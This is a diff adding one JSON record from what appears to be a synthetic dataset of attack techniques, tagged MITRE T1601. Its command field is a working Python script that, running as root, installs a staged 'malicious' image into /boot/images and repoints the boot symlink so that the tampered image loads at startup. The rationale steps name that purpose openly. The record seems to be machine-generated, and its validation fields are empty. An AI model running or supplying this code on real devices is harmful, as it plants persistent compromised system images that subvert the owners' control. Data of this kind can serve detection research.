@@ -1,0 +1,22 @@
+{
+  "technique_id": "T1601",
+  "platform": "Network Devices",
+  "shell": "Python",
+  "command": "python3 - <<'PY'\nimport os, sys, shutil, filecmp\nif os.geteuid() != 0:\n    sys.exit(\"root required\")\n\nstaged = \"/tmp/system_patched.img\"\ndeploy_dir = \"/boot/images\"\ndeploy = os.path.join(deploy_dir, \"system_patched.img\")\ncur_link = os.path.join(deploy_dir, \"current\")\n\nos.makedirs(deploy_dir, exist_ok=True)\nshutil.copy2(staged, deploy)\nassert filecmp.cmp(staged, deploy, shallow=False)\n\nif os.path.islink(cur_link):\n    os.remove(cur_link)\nos.symlink(deploy, cur_link)\nprint(\"Boot image set to:\", os.readlink(cur_link))\nPY",
+  "explanation": "Installs a patched system image into the boot directory and repoints the boot 'current' symlink to it after verifying byte-for-byte equality with the staged file.",
+  "rationale_steps": [
+    "Require root to modify boot image directories and symlinks.",
+    "Copy the staged malicious image into the boot images directory.",
+    "Verify byte equality using filecmp, then repoint the boot symlink to ensure the tampered image is selected at boot."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-PYTHON-T1601-0c03443f-e854a5df",
+  "source_prompt_hash": "0c03443f",
+  "timestamp_utc": "2025-09-30T04:56:19.919567Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
